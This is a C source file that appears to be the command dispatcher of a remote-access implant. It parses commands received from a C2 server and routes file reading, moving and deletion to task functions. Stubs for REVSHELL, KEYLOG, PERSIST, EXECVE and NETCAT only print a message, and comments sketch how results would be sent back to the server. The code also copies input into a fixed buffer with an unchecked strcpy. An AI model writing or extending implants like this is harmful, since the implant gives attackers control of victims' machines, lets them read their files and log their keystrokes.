//
// Created by melo on 4/8/25.
//

#include "choice.h"
#include "tasks.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>  // For NULL

void choice(char * buffer_fetch, char * user_ID) {
    char buffer[1024];
    strcpy(buffer, buffer_fetch); // Create a copy to avoid modifying original

    char * command = strtok(buffer, ",");
    char * task_result = malloc(1024 * 1024); // Allocate large buffer for results
    if (task_result == NULL) {
        perror("Memory allocation failed");
        return;
    }
    task_result[0] = '\0'; // Initialize as empty string

    char * task_ID = NULL;

    if (strcmp(command, "SLEEP") == 0) {
        task_ID = sleep_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            task_result[0] = '\0';
        }
    }
    else if (strcmp(command, "CAT") == 0) {
        task_ID = cat_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Cat task completed, task ID: %s\n", task_ID);
            printf("Result length: %zu bytes\n", strlen(task_result));
        }
    }
    else if (strcmp(command, "EXECVE") == 0) {
        printf("EXECVE command received\n");
    }
    else if (strcmp(command, "LOCATE") == 0) {
        printf("LOCATE command received\n");
    }
    else if (strcmp(command, "REVSHELL") == 0) {
        printf("REVSHELL command received\n");
    }
    else if (strcmp(command, "KEYLOG") == 0) {
        printf("KEYLOG command received\n");
    }
    else if (strcmp(command, "PERSIST") == 0) {
        printf("PERSIST command received\n");
    }
    else if (strcmp(command, "MV") == 0) {
    	task_ID = mv_task(buffer_fetch);
    	if (task_ID != NULL) {
        	task_result[0] = '\0';
    }
}
    else if (strcmp(command, "RM") == 0) {
        task_ID = rm_task(buffer_fetch);
    	if (task_ID != NULL) {
        	task_result[0] = '\0';
    	}
    }
    else if (strcmp(command, "PS") == 0) {
        printf("PS command received\n");
    }
    else if (strcmp(command, "NETCAT") == 0) {
        printf("NETCAT command received\n");
    }
    else {
        printf("Unknown command: %s\n", command);
    }

    // Here you would send the results back to the C2 server
    // Format: user_ID, task_ID, task_result (base64)
    if (task_ID != NULL) {
        printf("Task completed - User ID: %s, Task ID: %s\n", user_ID, task_ID);

        // Send back the result to the C2 server with format: user_ID,task_ID,result_base64
        // Example of code you might add here:
        // char response[1024 * 1024 + 256];
        // snprintf(response, sizeof(response), "%s,%s,%s", user_ID, task_ID, task_result);
        // send_to_server(response);

        free(task_ID); // Free the task_ID allocated by the task function
    }

    free(task_result);
}